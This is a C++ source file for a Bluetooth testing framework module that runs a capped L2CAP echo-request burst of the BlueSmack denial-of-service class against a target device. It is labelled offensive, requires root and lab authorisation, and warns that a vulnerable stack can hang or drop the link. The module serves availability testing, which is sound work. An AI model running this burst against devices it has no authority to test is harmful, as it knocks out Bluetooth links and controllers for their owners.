#include "core/bt.h"
#include "core/config.h"
#include "core/module.h"

#include <sstream>

namespace {
using namespace blueboy;

/// L2CAP echo burst (the BlueSmack class). Rate, payload and duration are
/// capped again inside bt::l2cap_echo_burst, so a config edit cannot exceed
/// 500 pps / 600 B / 30 s.
class Bluesmack : public Module {
public:
  std::string name() const override { return "bluesmack"; }
  std::string category() const override { return "offensive"; }
  std::string description() const override {
    return "Bounded L2CAP echo burst (BlueSmack class availability test)";
  }
  std::string cve() const override { return "CVE-2003-0467 (historic class)"; }
  std::string requirements() const override {
    return "root or CAP_NET_RAW, lab authorisation";
  }
  bool offensive() const override { return true; }
  std::string impact() const override {
    return "Sends up to 500 echo requests/s for up to 30 s. A vulnerable stack "
           "can drop the link, hang the controller or need a power cycle.";
  }

  ModuleResult run(const ModuleContext &ctx) override {
    ModuleResult r;
    const int payload = ctx.config->get_int("dos", "echo_payload", 600);
    const int rate = ctx.config->get_int("dos", "echo_rate", 100);
    const int duration = ctx.config->get_int("dos", "echo_duration", 10);

    int replied = 0;
    const int sent =
        bt::l2cap_echo_burst(ctx.target, payload, rate, duration, replied);

    std::ostringstream summary;
    summary << "Echo burst finished: " << sent << " request(s) sent, " << replied
            << " replied";
    r.summary = summary.str();
    r.success = sent > 0;

    r.add("Payload " + std::to_string(payload) +
          " B, target rate " + std::to_string(rate) + " pps, duration " +
          std::to_string(duration) + " s (hard caps applied)");
    r.add("Replies received: " + std::to_string(replied));
    r.add("PSM 1 (SDP) is the standard echo endpoint tested by this module");

    if (sent == 0)
      r.advise("No packet left the adapter: check CAP_NET_RAW, adapter power "
               "and that the peer is in range");
    if (sent > 0 && replied == 0)
      r.add("Peer stopped answering echo during the burst (loss or link drop)");
    r.advise("Record link state on both sides after the run; a controller that "
             "needs a power cycle confirms the availability impact");
    r.advise("Never run this outside a documented maintenance window");
    return r;
  }
};

REGISTER_MODULE(Bluesmack);
} // namespace
